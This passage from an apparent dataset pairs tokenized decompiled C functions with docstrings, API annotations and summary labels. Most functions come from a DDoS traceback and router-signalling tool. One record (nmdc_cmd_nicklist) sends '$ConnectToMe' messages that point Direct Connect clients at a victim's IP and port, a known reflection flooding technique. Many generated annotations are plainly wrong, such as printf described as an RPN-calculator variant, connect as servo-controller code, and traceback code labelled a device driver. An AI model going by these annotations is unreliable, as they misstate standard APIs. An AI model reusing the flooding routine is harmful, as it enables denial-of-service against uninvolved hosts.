            "sockfd",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error sending control signal. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "else",
            "{",
            "v3",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v4",
            "=",
            "strerror",
            "(",
            "*",
            "v3",
            ")",
            ";",
            "v5",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "saddr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "printf",
            "(",
            "\"Error connecting to router: %s:%u. Reason: %s\\n\"",
            ",",
            "v5",
            ",",
            "port",
            ",",
            "v4",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "return",
            "sockfd",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword from the FS segment register on x86 architectures, providing access to thread information block (TIB) data, often utilized in low-level system programming or debugging tasks.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing memory to zero or another constant value.",
            "The `connect` function facilitates establishing a connection over a serial port for communication with Pololu SSCs (Servo Serial Controllers) by handling socket operations, including connection establishment and error handling, within a provided structure.",
            "The function `printf` is a customized version of the standard C function `printf`, tailored for a Reverse Polish Notation (RPN) calculator, with additional features such as handling mathematical operations and special formatting for system-dependent values like infinity and NaN."
        ],
        "longer_label": "The function `endhost_send_signal_to_router` establishes a socket connection to a specified network address and port, sends a \"DDOS detected\" signal upon successful connection, logs the event with timestamp and details, and handles errors related to socket creation, connection establishment, and signal sending."
    },
    {
        "id": 285,
        "docstring_tokens": [
            "This",
            "code",
            "function",
            "handles",
            "a",
            "DDoS",
            "notification",
            "by",
            "reading",
            "data",
            "from",
            "a",
            "socket",
            ",",
            "sending",
            "a",
            "signal",
            "to",
            "multiple",
            "routers",
            ",",
            "and",
            "setting",
            "a",
            "static",
            "variable",
            "to",
            "indicate",
            "that",
            "the",
            "signal",
            "has",
            "been",
            "sent",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "sockfd",
            ")",
            "{",
            "unsigned",
            "int",
            "i",
            ";",
            "char",
            "buf",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buf",
            ")",
            ")",
            ";",
            "if",
            "(",
            "signal_sent_5664",
            ")",
            "return",
            "0",
            ";",
            "read",
            "(",
            "sockfd",
            ",",
            "buf",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "input",
            ".",
            "num_routers",
            ">",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "endhost_send_signal_to_router",
            "(",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_addr",
            ",",
            "input",
            ".",
            "tcp_port",
            ")",
            ";",
            "signal_sent_5664",
            "=",
            "1",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword (8 bytes) from the FS segment register at a specified offset, primarily utilized in low-level programming for accessing thread information or other system-specific data structures in Windows operating systems.",
            "The `signal` function is likely intended for handling signal events in a program, potentially related to synchronization mechanisms such as semaphores or interrupt handling, as indicated by its usage in managing mutex, full, empty, and producer-consumer operations in the provided code snippets."
        ],
        "longer_label": "The given code appears to handle a distributed denial-of-service (DDoS) notification by reading data from a socket, sending signals to multiple routers, and setting a flag to prevent multiple notifications from being processed."
    },
    {
        "id": 286,
        "docstring_tokens": [
            "This",
            "code",
            "updates",
            "the",
            "distance",
            "of",
            "a",
            "router",
            "in",
            "a",
            "network",
            "based",
            "on",
            "a",
            "traceback",
            "attack",
            ",",
            "logging",
            "the",
            "updated",
            "distance",
            "and",
            "router",
            "information",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "in_addr",
            "addr",
            ",",
            "uint8_t",
            "ttl",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "const",
            "char",
            "*",
            "v3",
            ";",
            "double",
            "v4",
            ";",
            "in_addr",
            "addra",
            ";",
            "uint8_t",
            "i",
            ";",
            "uint8_t",
            "distance",
            ";",
            "char",
            "str",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "addra",
            ".",
            "s_addr",
            "=",
            "addr",
            ".",
            "s_addr",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "distance",
            "=",
            "65",
            "-",
            "ttl",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "input",
            ".",
            "num_routers",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_updated",
            "&",
            "&",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_addr",
            "=",
            "=",
            "addra",
            ".",
            "s_addr",
            ")",
            "{",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_updated",
            "=",
            "1",
            ";",
            "input",
            ".",
            "routers",
            "[",
            "i",
            "]",
            ".",
            "router_dist",
            "=",
            "distance",
            ";",
            "v2",
            "=",
            "distance",
            ";",
            "v3",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addra",
            ",",
            "str",
            ",",
            "0x10u",
            ")",
            ";",
            "v4",
            "=",
            "_time",
            "(",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  %s  %u\\n\"",
            ",",
            "v4",
            ",",
            "v3",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `fsqword` function appears to allocate memory dynamically, prompt the user for input, copy the input string into the allocated memory, and store it in a structure, likely used for processing or storage purposes, utilizing inline assembly to access segment registers for thread-local storage, likely for security or optimization reasons.",
            "The function `inet_` likely serves as a wrapper for handling network address conversions and socket operations, facilitating the conversion of IPv4 addresses from string literals to binary format and vice versa, along with other networking tasks such as checking connection permissions.",
            "",
            "The `printf` function is being redefined and analyzed for usage, potentially for a Reverse Polish Notation (RPN) calculator or for formatting purposes, with the snippets including type definitions, macro definitions, and a simple usage example in a C program."
        ],
        "longer_label": "The provided code appears to handle traceback attacks by updating router information, including distance and last update time, based on received network packets, utilizing functions for memory allocation, network address conversion, and logging."
    },
    {
        "id": 287,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "compares",
            "two",
            "IPv4",
            "addresses",
            "and",
            "returns",
            "-1",
            "if",
            "the",
            "first",
            "address",
            "is",
            "smaller",
            ",",
            "1",
            "if",
            "the",
            "first",
            "address",
            "is",
            "larger",
            ",",
            "and",
            "0",
            "if",
            "the",
            "addresses",
            "are",
            "equal",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "void",
            "*",
            "a",
            ",",
            "const",
            "void",
            "*",
            "b",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            ">",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ")",
            "return",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            ">",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ";",
            "else",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a comparison function `endhost_compare_attackers` for sorting integers in ascending order."
    },
    {
        "id": 288,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "handles",
            "and",
            "stores",
            "traceback",
            "paths",
            "for",
            "potential",
            "end",
            "host",
            "attackers",
            "in",
            "a",
            "tree",
            "data",
            "structure",
            "based",
            "on",
            "the",
            "received",
            "buffer",
            "data",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "buf",
            ",",
            "uint16_t",
            "buflen",
            ")",
            "{",
            "uint8_t",
            "i",
            ";",
            "uint8_t",
            "j",
            ";",
            "uint8_t",
            "newa",
            ";",
            "unsigned",
            "__int8",
            "num_ips",
            ";",
            "uint32_t",
            "ddos_ip",
            ";",
            "endhost_attacker_t",
            "*",
            "attacker",
            ";",
            "endhost_attacker_t",
            "*",
            "*",
            "found",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "newa",
            "=",
            "0",
            ";",
            "num_ips",
            "=",
            "buf",
            "[",
            "5",
            "]",
            ";",
            "ddos_ip",
            "=",
            "_byteswap_ulong",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "buf",
            "+",
            "6",
            ")",
            ")",
            ";",
            "found",
            "=",
            "(",
            "endhost_attacker_t",
            "*",
            "*",
            ")",
            "tfind",
            "(",
            "&",
            "ddos_ip",
            ",",
            "&",
            "attacker_tree",
            ",",
            "(",
            "__compar_fn_t",
            ")",
            "endhost_compare_attackers",
            ")",
            ";",
            "if",
            "(",
            "found",
            ")",
            "{",
            "attacker",
            "=",
            "*",
            "found",
            ";",
            "if",
            "(",
            "num_ips",
            "<",
            "=",
            "attacker",
            "-",
            ">",
            "attacker_n_nodes",
            ")",
            "return",
            ";",
            "}",
            "else",
            "{",
            "attacker",
            "=",
            "(",
            "endhost_attacker_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x48uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "attacker",
            ")",
            "__assert_fail",
            "(",
            "\"attacker != NULL\"",
            ",",
            "\"endhost.c\"",
            ",",
            "0x198u",
            ",",
            "\"endhost_handle_traceback_path\"",
            ")",
            ";",
            "newa",
            "=",
            "1",
            ";",
            "}",
            "attacker",
            "-",
            ">",
            "attacker_addr",
            "=",
            "ddos_ip",
            ";",
            "attacker",
            "-",
            ">",
            "attacker_n_nodes",
            "=",
            "num_ips",
            ";",
            "j",
            "=",
            "6",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "num_ips",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "attacker",
            "-",
            ">",
            "attacker_nodes",
            "[",
            "i",
            "]",
            "=",
            "_byteswap_ulong",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "buf",
            "[",
            "j",
            "]",
            ")",
            ";",
            "j",
            "+",
            "=",
            "4",
            ";",
            "}",
            "if",
            "(",
            "newa",
            ")",
            "{",
            "found",
            "=",
            "(",
            "endhost_attacker_t",
            "*",
            "*",
            ")",
            "tsearch",
            "(",
            "attacker",
            ",",
            "&",
            "attacker_tree",
            ",",
            "(",
            "__compar_fn_t",
            ")",
            "endhost_compare_attackers",
            ")",
            ";",
            "if",
            "(",
            "attacker",
            "!",
            "=",
            "*",
            "found",
            ")",
            "__assert_fail",
            "(",
            "\"*found == attacker\"",
            ",",
            "\"endhost.c\"",
            ",",
            "0x1AFu",
            ",",
            "\"endhost_handle_traceback_path\"",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` seems to be part of a low-level system or device driver code, likely used for reading data from a device or file system, and possibly handling I/O control operations and weak symbol declarations in a C or C++ program.",
            "Based on the provided information, the function named \"qword\" likely deals with operations or manipulations involving quad-words (64-bit data) but without specific code snippets, its exact functionality cannot be determined."
        ],
        "longer_label": "The code is a low-level system or device driver function for handling traceback paths and manipulating quad-word data in a C or C++ program, likely related to I/O control operations."
    },
    {
        "id": 289,
        "docstring_tokens": [
            "The",
            "function",
            "endhost_print_attacker_path",
            "prints",
            "the",
            "path",
            "of",
            "an",
            "attacker",
            "node",
            "in",
            "a",
            "network",
            "to",
            "a",
            "log",
            "file",
            "and",
            "console",
            ",",
            "starting",
            "from",
            "the",
            "attacker",
            "node",
            "itself",
            "and",
            "traversing",
            "through",
            "its",
            "connected",
            "nodes",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "void",
            "*",
            "node",
            ",",
            "const",
            "VISIT",
            "which",
            ",",
            "const",
            "int",
            "depth",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v3",
            ";",
            "const",
            "char",
            "*",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "int8_t",
            "j",
            ";",
            "int8_t",
            "i",
            ";",
            "in_addr",
            "addr",
            ";",
            "endhost_attacker_t",
            "*",
            "attacker",
            ";",
            "char",
            "buf",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "i",
            "=",
            "1",
            ";",
            "attacker",
            "=",
            "*",
            "(",
            "endhost_attacker_t",
            "*",
            "*",
            ")",
            "node",
            ";",
            "if",
            "(",
            "!",
            "attacker",
            "-",
            ">",
            "attacker_visited",
            ")",
            "{",
            "attacker",
            "-",
            ">",
            "attacker_visited",
            "=",
            "1",
            ";",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "self_addr",
            ")",
            ";",
            "v3",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%s, \"",
            ",",
            "v3",
            ")",
            ";",
            "printf",
            "(",
            "\"%s, \"",
            ",",
            "buf",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "attacker",
            "-",
            ">",
            "attacker_n_nodes",
            "-",
            "1",
            ";",
            "j",
            ">",
            "0",
            ";",
            "-",
            "-",
            "j",
            ")",
            "{",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "attacker",
            "-",
            ">",
            "attacker_nodes",
            "[",
            "j",
            "]",
            ")",
            ";",
            "v4",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%s %u, \"",
            ",",
            "v4",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            ")",
            ";",
            "printf",
            "(",
            "\"%s %u, \"",
            ",",
            "buf",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            "+",
            "+",
            ")",
            ";",
            "}",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "attacker",
            "-",
            ">",
            "attacker_nodes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "v5",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%s\\n\"",
            ",",
            "v5",
            ")",
            ";",
            "puts",
            "(",
            "buf",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            ".",
            "loghdl",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `htonl` function is used to convert a 32-bit integer from host byte order to network byte order, ensuring consistent representation across different systems with varying endianness."
        ],
        "longer_label": "The provided code is a C function `endhost_print_attacker_path` that prints the path of an attacker, converting IP addresses from host byte order to network byte order using `htonl`, and ensuring that each node in the path is visited only once."
    },
    {
        "id": 290,
        "docstring_tokens": [
            "The",
            "function",
            "nmdc_cmd_nicklist",
            "takes",
            "a",
            "client",
            "and",
            "a",
            "parameter",
            ",",
            "splits",
            "the",
            "parameter",
            "into",
            "nicknames",
            "using",
            "delimiters",
            "$",
            "and",
            "|",
            ",",
            "constructs",
            "a",
            "message",
            "to",
            "connect",
            "to",
            "each",
            "nickname",
            "'s",
            "IP",
            "and",
            "port",
            ",",
            "and",
            "sends",
            "it",
            "to",
            "the",
            "client",
            "'s",
            "victim",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "v2",
            ";",
            "size_t",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "size_t",
            "v5",
            ";",
            "size_t",
            "v6",
            ";",
            "size_t",
            "v7",
            ";",
            "const",
            "char",
            "*",
            "src",
            ";",
            "char",
            "*",
            "dest",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "strlen",
            "(",
            "a2",
            ")",
            ";",
            "dest",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "v2",
            "+",
            "1",
            ")",
            ";",
            "v10",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x401uL",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "a2",
            ")",
            ";",
            "memset",
            "(",
            "dest",
            ",",
            "0",
            ",",
            "v3",
            "+",
            "1",
            ")",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "a2",
            ")",
            ";",
            "strncpy",
            "(",
            "dest",
            ",",
            "a2",
            ",",
            "v4",
            ")",
            ";",
            "printf",
            "(",
            "\"Received NickList = '%s'\\n\"",
            ",",
            "a2",
            ")",
            ";",
            "for",
            "(",
            "src",
            "=",
            "strtok",
            "(",
            "dest",
            ",",
            "\"$|\"",
            ")",
            ";",
            "src",
            ";",
            "src",
            "=",
            "strtok",
            "(",
            "0L",
            "L",
            ",",
            "\"$|\"",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Nick = '%s'\\n\"",
            ",",
            "src",
            ")",
            ";",
            "memset",
            "(",
            "v10",
            ",",
            "0",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "qmemcpy",
            "(",
            "v10",
            ",",
            "\"$ConnectToMe \"",
            ",",
            "13",
            ")",
            ";",
            "v5",
            "=",
            "strlen",
            "(",
            "src",
            ")",
            ";",
            "strncat",
            "(",
            "v10",
            ",",
            "src",
            ",",
            "v5",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "strlen",
            "(",
            "v10",
            ")",
            "]",
            "=",
            "32",
            ";",
            "v6",
            "=",
            "strlen",
            "(",
            "*",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            ";",
            "strncat",
            "(",
            "v10",
            ",",
            "*",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ",",
            "v6",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "strlen",
            "(",
            "v10",
            ")",
            "]",
            "=",
            "58",
            ";",
            "v7",
            "=",
            "strlen",
            "(",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ")",
            ";",
            "strncat",
            "(",
            "v10",
            ",",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ",",
            "v7",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "strlen",
            "(",
            "v10",
            ")",
            "]",
            "=",
            "124",
            ";",
            "client_send",
            "(",
            "a1",
            ",",
            "v10",
            ")",
            ";",
            "}",
            "free",
            "(",
            "dest",
            ")",
            ";",
            "free",
            "(",
            "v10",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function is typically used for dynamic memory allocation, but in this case, it has been redefined to allocate memory using `GlobalAlloc` with `GMEM_ZEROINIT` flag in a Windows environment, potentially for specific application requirements or compatibility.",
            "The function `strlen` is designed to calculate the length of a null-terminated string in C, and it appears to be re-implemented in the given code snippets for optimization purposes by providing an alternative implementation of standard library functions like `memset` and `strlen`.",
            "The `strncpy` function is used to copy at most `n` characters from the source string to the destination string, ensuring that the destination string is null-terminated and preventing buffer overflow.",
            "The `printf` function in the provided code snippets is used for formatted output to the standard output stream in C programming, typically printing strings and values with specified formats and modifiers.",
            "The `strtok` function is used for tokenizing a string by breaking it into a sequence of tokens delimited by a set of specified delimiter characters.",
            "The function `memset` is used to set a block of memory to a specific value, often used for initialization or clearing memory, and can be implemented using built-in functions like `__builtin_memset` or externally provided implementations like `__sel4runtime_memset`.",
            "The function `qmemcpy` appears to be a customized memcpy implementation optimized for performance, possibly utilizing platform-specific optimizations like aligned memory access, providing faster memory copying when certain alignment conditions are met."
        ],
        "longer_label": "The provided code is a C function `nmdc_cmd_nicklist` that dynamically allocates memory using a custom implementation of `malloc`, optimizes string manipulation functions such as `strlen`, `memset`, and `strncpy`, and iterates through a given input string to construct and send formatted messages via `client_send` in a Windows environment."
    },
    {
        "id": 291,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "endhost_handle_traceback_message",
            "`",
            "receives",
            "and",
            "processes",
            "traceback",
            "messages",
            ",",
            "extracting",
            "TTL",
            "information",
            "and",
            "victim",
            "addresses",
            ",",
            "then",
            "handles",
            "the",
            "message",
            "based",
            "on",
            "its",
            "type",
            ",",
            "and",
            "returns",
            "1",
            "if",
            "the",
            "message",
            "count",
            "reaches",
            "a",
            "stop",
            "threshold",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "sockfd",
            ")",
            "{",
            "struct",
            "cmsghdr",
            "*",
            "msg_control",
            ";",
            "int",
            "cmsg_type",
            ";",
            "uint32_t",
            "ttl",
            ";",
            "int",
            "rc",
            ";",
            "struct",
            "cmsghdr",
            "*",
            "cmsg",
            ";",
            "msghdr",
            "msg",
            ";",
            "iovec",
            "iov",
            "[",
            "1",
            "]",
            ";",
            "sockaddr_in",
            "addr",
            ";",
            "char",
            "iovb",
            "[",
            "256",
            "]",
            ";",
            "char",
            "buf",
            "[",
            "272",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "LOBYTE",
            "(",
            "ttl",
            ")",
            "=",
            "0",
            ";",
            "memset",
            "(",
            "iovb",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "iovb",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "msg",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "msg",
            ")",
            ")",
            ";",
            "iov",
            "[",
            "0",
            "]",
            ".",
            "iov_base",
            "=",
            "iovb",
            ";",
            "iov",
            "[",
            "0",
            "]",
            ".",
            "iov_len",
            "=",
            "256L",
            "L",
            ";",
            "msg",
            ".",
            "msg_iov",
            "=",
            "iov",
            ";",
            "msg",
            ".",
            "msg_iovlen",
            "=",
            "1L",
            "L",
            ";",
            "msg",
            ".",
            "msg_control",
            "=",
            "buf",
            ";",
            "msg",
            ".",
            "msg_controllen",
            "=",
            "272L",
            "L",
            ";",
            "msg",
            ".",
            "msg_name",
            "=",
            "&",
            "addr",
            ";",
            "msg",
            ".",
            "msg_namelen",
            "=",
            "16",
            ";",
            "rc",
            "=",
            "recvmsg",
            "(",
            "sockfd",
            ",",
            "&",
            "msg",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "msg",
            ".",
            "msg_controllen",
            "<",
            "=",
            "0xF",
            ")",
            "msg_control",
            "=",
            "0L",
            "L",
            ";",
            "else",
            "msg_control",
            "=",
            "(",
            "struct",
            "cmsghdr",
            "*",
            ")",
            "msg",
            ".",
            "msg_control",
            ";",
            "for",
            "(",
            "cmsg",
            "=",
            "msg_control",
            ";",
            "cmsg",
            ";",
            "cmsg",
            "=",
            "__cmsg_nxthdr",
            "(",
            "&",
            "msg",
            ",",
            "cmsg",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "cmsg",
            "-",
            ">",
            "cmsg_level",
            ")",
            "{",
            "cmsg_type",
            "=",
            "cmsg",
            "-",
            ">",
            "cmsg_type",
            ";",
            "if",
            "(",
            "cmsg_type",
            "=",
            "=",
            "2",
            ")",
            "{",
            "ttl",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "cmsg",
            "-",
            ">",
            "__cmsg_data",
            ";",
            "}",
            "else",
            "if",
            "(",
            "cmsg_type",
            "=",
            "=",
            "8",
            "&",
            "&",
            "!",
            "self_addr",
            ")",
            "{",
            "self_addr",
            "=",
            "ntohl",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "cmsg",
            "-",
            ">",
            "__cmsg_data",
            "[",
            "4",
            "]",
            ")",
            ";",
            "}",
            "}",
            "}",
            "+",
            "+",
            "num_msgs_5724",
            ";",
            "if",
            "(",
            "_byteswap_ulong",
            "(",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "iovb",
            ")",
            "!",
            "=",
            "-",
            "559022355",
            ")",
            "__assert_fail",
            "(",
            "\"GET_UINT32(iovb) == TRACEBACK_MAGIC\"",
            ",",
            "\"endhost.c\"",
            ",",
            "0x232u",
            ",",
            "\"endhost_handle_traceback_message\"",
            ")",
            ";",
            "if",
            "(",
            "iovb",
            "[",
            "4",
            "]",
            "=",
            "=",
            "1",
            ")",
            "{",
            "endhost_handle_traceback_attack",
            "(",
            "addr",
            ".",
            "sin_addr",
            ",",
            "ttl",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "iovb",
            "[",
            "4",
            "]",
            "!",
            "=",
            "2",
            ")",
            "__assert_fail",
            "(",
            "\"0\"",
            ",",
            "\"endhost.c\"",
            ",",
            "0x23Eu",
            ",",
            "\"endhost_handle_traceback_message\"",
            ")",
            ";",
            "endhost_handle_traceback_path",
            "(",
            "iovb",
            ",",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "input",
            ".",
            "stop_threshold",
            "=",
            "=",
            "num_msgs_5724",
            ")",
            "{",
            "twalk",
            "(",
            "attacker_tree",
            ",",
            "(",
            "__action_fn_t",
            ")",
            "endhost_print_attacker_path",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "else",
            "{",
            "return",
            "0",
            ";",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error receiving message. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read an unsigned 64-bit integer from the FS segment register at a specified offset, primarily for low-level system programming on x86 or x64 architectures, possibly for accessing thread information or other system-specific data structures.",
            "The `memset` function is utilized to set a block of memory to a specified value, typically used for initializing memory to zero or some other constant value efficiently."
        ],
        "longer_label": "The provided code appears to handle incoming messages on a socket, extracting control data using `recvmsg`, parsing specific control message types including TTL and self-address information, and then taking action based on the received message content, with additional annotations explaining the usage of `__readfsqword` and `memset`."
    },
    {
        "id": 292,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "listens",
            "for",
            "incoming",
            "messages",
            "on",
            "two",
            "socket",
            "connections",
            "and",
            "handles",
            "them",
            "accordingly",
            ",",
            "using",
            "the",
            "select",
            "(",
            ")",
            "function",
            "to",
            "monitor",
            "the",
            "sockets",
            "for",
            "activity",
            "and",
            "calling",
            "specific",
            "handler",
            "functions",
            "based",
            "on",
            "the",
            "type",
            "of",
            "message",
            "received",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "ddos_sockfd",
            ",",
            "int",
            "trbak_sockfd",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "int",
            "rc",
            ";",
            "fd_set",
            "rfds",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "rfds",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "rfds",
            ")",
            ")",
            ";",
            "rfds",
            ".",
            "fds_bits",
            "[",
            "ddos_sockfd",
            "/",
            "64",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
